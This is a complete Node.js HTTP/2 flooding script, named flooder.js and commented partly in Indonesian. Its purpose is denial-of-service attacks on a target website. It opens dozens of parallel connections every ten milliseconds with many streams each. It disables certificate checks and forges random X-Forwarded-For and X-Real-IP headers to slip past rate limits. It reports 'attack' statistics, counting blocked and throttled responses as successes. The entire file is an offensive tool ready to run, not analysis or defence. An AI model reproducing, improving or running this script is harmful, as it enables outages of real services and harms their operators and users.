
const target = process.argv[2];
const duration = parseInt(process.argv[3]);
const cookie = process.argv[4];
const userAgent = process.argv[5];
const proxy = process.argv[6];
const showLog = process.argv.includes('-log');

const http2 = require('http2');

// Global stats
let requestCount = 0;
let successCount = 0;
let errorCount = 0;
let http2Success = 0;

// Graceful shutdown
process.on('SIGINT', () => {
    if (showLog) console.clear();
    console.log('\n[+] Attack stopped by user (Ctrl+C)');
    console.log(`[+] Final Stats:`);
    console.log(`[+] Total Requests: ${requestCount}`);
    console.log(`[+] Success: ${successCount}`);
    console.log(`[+] Errors: ${errorCount}`);
    if (requestCount > 0) {
        console.log(`[+] Success Rate: ${Math.round((successCount / requestCount) * 100)}%`);
    }
    process.exit(0);
});

// Validasi input
if (process.argv.length < 6 || isNaN(duration)) {
    console.log('Usage: node flooder.js <URL> <DURATION> <COOKIE> <USER-AGENT> [PROXY] [-log]');
    console.log('Options:');
    console.log('  -log    Show real-time logs (optional)');
    process.exit(1);
}

// Parse URL
let url;
try {
    url = new URL(target);
} catch (e) {
    console.log('[!] Invalid URL');
    process.exit(1);
}

const hostname = url.hostname;
const path = url.pathname + url.search;
const port = url.port || 443;

if (showLog) {
    console.clear();
    console.log(`[+] Target: ${target}`);
    console.log(`[+] Duration: ${duration}s`);
    console.log(`[+] Cookie: ${cookie.substring(0, 30)}...`);
    console.log(`[+] User-Agent: ${userAgent.substring(0, 50)}...`);
    if (proxy) console.log(`[+] Proxy: ${proxy}`);
    console.log(`[+] HTTP/2 Only Attack Starting...`);
    console.log(`[+] Log every 5 seconds...`);
    console.log(`[+] Press Ctrl+C to stop\n`);
}

// TLS Options untuk HTTP/2
const tlsOptions = {
    rejectUnauthorized: false,
    ALPNProtocols: ['h2', 'http/1.1'],
    ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256',
    minVersion: 'TLSv1.2',
    maxVersion: 'TLSv1.3',
    settings: {
        headerTableSize: 65536,
        enablePush: false,
        initialWindowSize: 6291456,
        maxConcurrentStreams: 1000
    }
};

// Headers HTTP/2 lengkap
function getHttp2Headers() {
    return {
        ':method': 'GET',
        ':authority': hostname,
        ':path': path,
        ':scheme': 'https',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'cache-control': 'max-age=0',
        'cookie': cookie,
        'priority': 'u=0, i',
        'sec-ch-ua': '"Not-A.Brand";v="24", "Chromium";v="146"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': userAgent,
        'x-forwarded-for': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`,
        'x-real-ip': `${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}.${Math.floor(Math.random()*255)}`
    };
}

// HTTP/2 Request dengan multiple streams
function makeHttp2Request() {
    try {
        const client = http2.connect(`https://${hostname}:${port}`, tlsOptions);

        client.on('error', (err) => {
            errorCount++;
            client.destroy();
        });

        client.on('connect', () => {
            // Kirim multiple streams (10 per koneksi)
            for (let i = 0; i < 10; i++) {
                const headers = getHttp2Headers();
                const req = client.request(headers);

                req.on('response', (headers) => {
                    const status = headers[':status'];
                    if (status === 200 || status === 403 || status === 429) {
                        successCount++;
                        http2Success++;
                    }
                });

                req.on('error', () => errorCount++);
                req.end();
                requestCount++;
            }

            // Close client setelah 1 detik
            setTimeout(() => client.destroy(), 1000);
        });

    } catch (error) {
        errorCount++;
    }
}

// Attack loop - HTTP/2 ONLY!
let lastLogTime = Date.now();

const attackInterval = setInterval(() => {
    for (let i = 0; i < 50; i++) { // 50 koneksi parallel
        makeHttp2Request();
    }
}, 10);

// Logging
let logInterval;
if (showLog) {
    logInterval = setInterval(() => {
        const now = Date.now();
        const elapsed = (now - lastLogTime) / 1000;
        
        console.clear();
        console.log(`[+] Target: ${hostname}`);
        console.log(`[+] Duration: ${duration}s | Remaining: ${Math.max(0, duration - Math.floor((now - lastLogTime)/1000))}s`);
        console.log(`[+] Mode: HTTP/2 ONLY`);
        console.log(`[+] Total Requests: ${requestCount.toLocaleString()}`);
        console.log(`[+] Success: ${successCount.toLocaleString()}`);
        console.log(`[+] Errors: ${errorCount.toLocaleString()}`);
        console.log(`[+] RPS: ${Math.round(requestCount / elapsed).toLocaleString()}`);
        console.log(`[+] HTTP/2 Success: ${http2Success.toLocaleString()}`);
        
        lastLogTime = now;
    }, 5000);
}

// Stop after duration
setTimeout(() => {
    clearInterval(attackInterval);
    if (logInterval) clearInterval(logInterval);
    
    if (showLog) console.clear();
    
    console.log('\n[+] Attack finished!');
    console.log(`[+] Final Stats:`);
    console.log(`[+] Total Requests: ${requestCount.toLocaleString()}`);
    console.log(`[+] Success: ${successCount.toLocaleString()}`);
    console.log(`[+] Errors: ${errorCount.toLocaleString()}`);
    if (requestCount > 0) {
        console.log(`[+] Success Rate: ${Math.round((successCount / requestCount) * 100)}%`);
    }
    process.exit(0);
}, duration * 1000);